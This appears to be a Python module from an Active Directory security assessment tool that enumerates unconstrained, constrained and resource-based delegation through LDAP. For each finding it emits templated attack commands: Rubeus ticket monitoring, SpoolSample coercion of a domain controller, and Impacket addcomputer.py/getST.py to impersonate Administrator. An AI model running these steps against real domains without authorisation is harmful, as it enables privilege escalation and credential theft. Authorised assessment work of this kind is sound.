"""
Delegation Mapper — maps all three delegation types.

  Unconstrained  : TRUSTED_FOR_DELEGATION (0x80000) — any auth hands over TGT
  Constrained    : msDS-AllowedToDelegateTo — specific SPNs only
  RBCD           : msDS-AllowedToActOnBehalfOfOtherIdentity — on the target object

Returns a plain dict so scorer.py and reporter.py can consume it directly
without needing dataclass attribute access.
"""

from typing import Any


class DelegationMapper:
    def __init__(self, ldap_client):
        self.ldap = ldap_client

    def map_all(self) -> dict[str, list[dict[str, Any]]]:
        """
        Fix: previously returned a DelegationResults dataclass, but scorer.py and
        reporter.py both call delegations.get("unconstrained", []) and access entries
        as plain dicts (d["account"], d["detail"], d["type"], etc.).
        Now returns a plain dict of lists of dicts matching those expectations.
        """
        return {
            "unconstrained": self._find_unconstrained(),
            "constrained":   self._find_constrained(),
            "rbcd":          self._find_rbcd(),
        }

    # ------------------------------------------------------------------ #

    def _find_unconstrained(self) -> list[dict[str, Any]]:
        """
        TRUSTED_FOR_DELEGATION = 0x80000.
        Filter out DCs (primaryGroupID=516) — they always have this flag set.
        """
        entries = self.ldap.query(
            search_filter=(
                "(&"
                "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                "(!(primaryGroupID=516))"   # exclude DCs
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"  # exclude disabled
                ")"
            ),
            attributes=["sAMAccountName", "operatingSystem", "dNSHostName", "primaryGroupID"],
        )
        results = []
        for e in entries:
            account  = str(e["sAMAccountName"])
            dns_name = str(e["dNSHostName"].value or "") if "dNSHostName" in e else ""
            os_val   = str(e["operatingSystem"].value or "unknown") if "operatingSystem" in e else "unknown"
            results.append({
                "account":   account,
                "type":      "Computer" if account.endswith("$") else "User",
                "dns_name":  dns_name,
                "os":        os_val,
                "detail":    f"Unconstrained delegation — any authenticating user surrenders their TGT to {account}",
                "next_step": (
                    f"# Wait for a privileged user to authenticate to {account}, then extract TGT\n"
                    f"rubeus.exe monitor /interval:5 /filteruser:Administrator\n"
                    f"# Or use Coercion + SpoolSample/PetitPotam to force DC auth\n"
                    f"SpoolSample.exe <DC_HOSTNAME> {dns_name or account}"
                ),
            })
        return results

    def _find_constrained(self) -> list[dict[str, Any]]:
        entries = self.ldap.query(
            search_filter="(msDS-AllowedToDelegateTo=*)",
            attributes=[
                "sAMAccountName", "msDS-AllowedToDelegateTo", "userAccountControl"
            ],
        )
        results = []
        for e in entries:
            uac  = int(e["userAccountControl"].value or 0)
            # TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000 → S4U2Self (protocol transition)
            proto_transition = bool(uac & 0x1000000)
            allowed_to = [str(s) for s in (e["msDS-AllowedToDelegateTo"] or [])]
            account    = str(e["sAMAccountName"])
            results.append({
                "account":            account,
                "protocol_transition": proto_transition,
                "allowed_to":         allowed_to,  # Fix: reporter uses d.get("allowed_to") not "allowed_to_delegate"
                "detail": (
                    f"Constrained delegation with S4U2Self (protocol transition) — "
                    f"can impersonate any user to: {', '.join(allowed_to[:3])}"
                    if proto_transition else
                    f"Constrained delegation to: {', '.join(allowed_to[:3])}"
                ),
                "next_step": (
                    f"getST.py -spn {allowed_to[0]} -impersonate Administrator "
                    f"-dc-ip <DC_IP> <domain>/{account}:<pass>"
                ) if allowed_to else "",
            })
        return results

    def _find_rbcd(self) -> list[dict[str, Any]]:
        entries = self.ldap.query(
            search_filter="(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
            attributes=["sAMAccountName", "dNSHostName"],
        )
        results = []
        for e in entries:
            target   = str(e["sAMAccountName"])  # Fix: scorer uses d["target"], reporter uses d["target"]
            dns_name = str(e["dNSHostName"].value or "") if "dNSHostName" in e else ""
            results.append({
                "target":    target,             # Fix: was "target_account" in old dataclass
                "dns_name":  dns_name,
                "detail":    f"RBCD configured on {target} — check who holds write access to msDS-AllowedToActOnBehalfOfOtherIdentity",
                "next_step": (
                    f"# Add a controlled machine account, then abuse RBCD\n"
                    f"addcomputer.py -computer-name FAKE$ -computer-pass Pass123 <domain>/<user>:<pass>\n"
                    f"getST.py -spn cifs/{dns_name or target} -impersonate Administrator "
                    f"-dc-ip <DC_IP> <domain>/FAKE$:Pass123"
                ),
            })
        return results
